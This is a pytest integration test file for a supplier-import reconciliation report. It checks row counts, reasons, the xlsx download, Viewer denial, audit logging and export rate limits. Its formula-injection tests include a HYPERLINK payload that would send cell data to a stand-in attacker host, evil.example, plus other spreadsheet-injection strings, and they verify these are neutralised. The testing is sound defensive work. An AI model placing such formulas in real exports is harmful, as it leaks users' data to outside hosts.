"""Blueprint 8 C3 reconciliation report and API.md 5 export rules.

INV-IMP-05 (report counts and a reason per row), INV-IMP-08 (formula injection), INV-SEC-03 (Viewer cannot export),
INV-SEC-05 (export permission-checked and logged), API.md 6 (exports: 20 per hour per user)."""

import io
from collections.abc import Callable
from typing import Any
from uuid import UUID

import pytest
from sqlalchemy import Engine

from tests.factories.api import ApiClient, ApiFactory, problem
from tests.factories.contract import load
from tests.factories.db import SeededTenant, fetch_all
from tests.factories.imports import (
    Importer,
    by_row,
    counts,
    file_for,
    sheet_rows,
    summary,
    supplier_row,
)
from tests.factories.masters import make_supplier
from tests.integration.commands.test_command_audit_and_outbox import log_rows

pytestmark = pytest.mark.integration

DANGEROUS = ("=", "+", "-", "@", "\t", "\r")
SUMMARY_LABELS = {
    "Received": "received",
    "Valid": "valid",
    "Imported": "imported",
    "Duplicate": "duplicate",
    "Rejected": "rejected",
    "Unmapped": "unmapped",
    "Needs review": "review",
}


def mixed_batch(importer: Importer, quality: ApiClient) -> dict[str, Any]:
    """Seven rows: 3 valid (imported), 1 duplicate of an existing supplier, 1 duplicate inside the file,
    1 changed (review), 1 rejected."""
    make_supplier(quality, **{**supplier_row(2), "status": "approved"})
    make_supplier(quality, **{**supplier_row(100), "status": "approved"})
    rows: list[dict[str, Any] | None] = [
        supplier_row(4),  # row 2: valid
        supplier_row(6),  # row 3: valid
        supplier_row(8),  # row 4: valid
        supplier_row(2),  # row 5: duplicate of an existing supplier
        supplier_row(4, code="IN-FILE-DUP"),  # row 6: duplicate of row 2
        supplier_row(100, name="Changed by the file"),  # row 7: review
        supplier_row(12, category="plastic"),  # row 8: rejected
    ]
    data, name, ctype = file_for("suppliers", rows)
    return importer.run("suppliers", data, name, ctype, accept_partial=True)


def test_import_report_counts_reconcile_to_rows_received(
    importer: Importer, quality: ApiClient, seeded: SeededTenant, app_engine: Engine
) -> None:
    batch = mixed_batch(importer, quality)
    c = counts(batch)
    assert c == {
        "received": 7,
        "valid": 3,
        "imported": 3,
        "duplicate": 2,
        "rejected": 1,
        "unmapped": 0,
        "review": 1,
    }
    assert (
        c["imported"] + c["duplicate"] + c["rejected"] + c["unmapped"] + c["review"]
        == c["received"]
    )
    report = importer.report(batch["id"])
    figures = summary(report)
    assert set(figures) >= set(SUMMARY_LABELS), figures
    for label, key in SUMMARY_LABELS.items():
        assert figures[label] == c[key], label
        assert isinstance(figures[label], int), f"{label} must be a number, not text"
    by_status = {
        r["status"]: r["n"]
        for r in fetch_all(
            app_engine,
            seeded.id,
            "SELECT status, count(*) AS n FROM import_records WHERE batch_id = :b GROUP BY status",
            {"b": UUID(batch["id"])},
        )
    }
    assert by_status == {"imported": 3, "duplicate": 2, "rejected": 1, "review": 1}


def test_import_report_has_reason_per_non_imported_row(
    importer: Importer, quality: ApiClient
) -> None:
    batch = mixed_batch(importer, quality)
    sheet = sheet_rows(importer.report(batch["id"]), "Rows")
    header, body = sheet[0], sheet[1:]
    assert header[:3] == ["Row", "Status", "Reason"]
    assert len(body) == batch["rows_received"], "one line per received row, imported ones included"
    records = by_row(importer.records(batch["id"]))
    assert {int(r[0]) for r in body} == set(records)
    for row in body:
        number, status, reason = int(row[0]), row[1], row[2]
        assert status == records[number]["status"]
        if status != "imported":
            assert isinstance(reason, str) and reason.strip(), (
                f"row {number} ({status}) has no reason"
            )


def test_report_echoes_the_mapped_values_of_each_row(
    importer: Importer, quality: ApiClient
) -> None:
    batch = mixed_batch(importer, quality)
    sheet = sheet_rows(importer.report(batch["id"]), "Rows")
    header = sheet[0]
    assert {"code", "name", "category"} <= set(header[3:])
    name_col = header.index("name")
    assert sheet[1][name_col] == supplier_row(4)["name"]


def test_report_download_is_an_xlsx_attachment(importer: Importer, quality: ApiClient) -> None:
    batch = mixed_batch(importer, quality)
    resp = quality.get(f"/imports/{batch['id']}/report.xlsx")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith(
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    disposition = resp.headers["content-disposition"].lower()
    assert disposition.startswith("attachment") and ".xlsx" in disposition
    assert resp.content[:2] == b"PK"


def test_report_for_a_batch_that_is_not_completed_is_not_served(importer: Importer) -> None:
    data, name, ctype = file_for("suppliers", [supplier_row(2)])
    batch = importer.run("suppliers", data, name, ctype, confirm=False)
    resp = importer.client.get(f"/imports/{batch['id']}/report.xlsx")
    assert resp.status_code in (404, 409), resp.text
    problem(resp)


# =================================================================================================
# INV-IMP-08 formula injection
# =================================================================================================
PAYLOADS = [
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(1,1)",
]


def string_cells(workbook: Any) -> list[tuple[str, str]]:
    cells: list[tuple[str, str]] = []
    for ws in workbook.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if isinstance(cell.value, str):
                    cells.append((f"{ws.title}!{cell.coordinate}", cell.value))
    return cells


def test_export_neutralises_formula_injection(importer: Importer) -> None:
    """INV-IMP-08: every cell that starts with = + - @ TAB CR is prefixed with an apostrophe."""
    rows: list[dict[str, Any] | None] = [
        supplier_row(2 + 2 * i, name=payload) for i, payload in enumerate(PAYLOADS)
    ]
    rows.append(
        supplier_row(40, category=PAYLOADS[0])
    )  # a rejected row whose reason may echo the value
    data, name, ctype = file_for("suppliers", rows)
    batch = importer.run("suppliers", data, name, ctype, accept_partial=True)
    assert batch["rows_imported"] == len(PAYLOADS)
    report = importer.report(batch["id"])
    offenders = [(where, v) for where, v in string_cells(report) if v.startswith(DANGEROUS)]
    assert offenders == [], f"un-neutralised cells: {offenders}"
    cells = {v for _, v in string_cells(report)}
    for payload in PAYLOADS:
        assert "'" + payload in cells, f"the value must be kept, only prefixed: {payload}"


def test_report_cells_are_never_stored_as_formulas(importer: Importer) -> None:
    rows: list[dict[str, Any] | None] = [supplier_row(2, name=PAYLOADS[0])]
    data, name, ctype = file_for("suppliers", rows)
    batch = importer.run("suppliers", data, name, ctype, accept_partial=True)
    resp = importer.client.get(f"/imports/{batch['id']}/report.xlsx")
    workbook = load("openpyxl", "load_workbook")(io.BytesIO(resp.content))
    for ws in workbook.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                assert cell.data_type != "f", f"{ws.title}!{cell.coordinate} is a formula"


# =================================================================================================
# permission, logging, limits
# =================================================================================================
def test_viewer_cannot_export_excel(
    api: ApiFactory,
    importer: Importer,
    quality: ApiClient,
    seeded: SeededTenant,
    app_engine: Engine,
) -> None:
    """INV-SEC-03 (A-70): the Viewer is denied the import report, and nothing is logged for the attempt."""
    assert seeded.viewer
    batch = mixed_batch(importer, quality)
    viewer = api.login_as(seeded.viewer)
    before = len(log_rows(app_engine, seeded.id, UUID(batch["id"])))
    resp = viewer.get(f"/imports/{batch['id']}/report.xlsx")
    assert resp.status_code == 403 and problem(resp)["code"] == "forbidden"
    assert len(log_rows(app_engine, seeded.id, UUID(batch["id"]))) == before


def test_export_writes_activity_log(
    importer: Importer, quality: ApiClient, seeded: SeededTenant, app_engine: Engine
) -> None:
    """INV-SEC-05: a download of the report is an auditable event (who, which batch, from where)."""
    assert seeded.quality
    batch = mixed_batch(importer, quality)
    bid = UUID(batch["id"])
    before = [r for r in log_rows(app_engine, seeded.id, bid) if "export" in r["action"]]
    assert before == []
    assert quality.get(f"/imports/{batch['id']}/report.xlsx").status_code == 200
    rows = [r for r in log_rows(app_engine, seeded.id, bid) if "export" in r["action"]]
    assert len(rows) == 1
    row = rows[0]
    assert row["object_type"] == "import_batch" and row["actor_type"] == "user"
    assert row["actor_id"] == seeded.quality.id
    assert row["ip"] is not None


def test_reading_a_batch_writes_no_audit_rows_only_the_export_does(
    importer: Importer, quality: ApiClient, seeded: SeededTenant, app_engine: Engine
) -> None:
    batch = mixed_batch(importer, quality)
    bid = UUID(batch["id"])
    before = len(log_rows(app_engine, seeded.id, bid))
    importer.get(batch["id"])
    importer.preview(batch["id"])
    importer.records(batch["id"])
    quality.get("/imports")
    assert len(log_rows(app_engine, seeded.id, bid)) == before


def test_export_is_rate_limited_to_twenty_per_hour_per_user(
    importer: Importer, quality: ApiClient
) -> None:
    data, name, ctype = file_for("suppliers", [supplier_row(2)])
    batch = importer.run("suppliers", data, name, ctype)
    statuses = [quality.get(f"/imports/{batch['id']}/report.xlsx").status_code for _ in range(21)]
    assert statuses[:20] == [200] * 20
    assert statuses[20] == 429
    last = quality.get(f"/imports/{batch['id']}/report.xlsx")
    assert last.status_code == 429 and int(last.headers["retry-after"]) <= 3600
    assert problem(last)["code"] == "rate_limited"


def test_export_limit_is_per_user_not_per_tenant(
    api: ApiFactory,
    importer: Importer,
    quality: ApiClient,
    seeded: SeededTenant,
    drain: Callable[[], None],
) -> None:
    assert seeded.admin
    data, name, ctype = file_for("suppliers", [supplier_row(2)])
    batch = importer.run("suppliers", data, name, ctype)
    for _ in range(21):
        quality.get(f"/imports/{batch['id']}/report.xlsx")
    admin = api.login_as(seeded.admin)
    assert admin.get(f"/imports/{batch['id']}/report.xlsx").status_code == 200
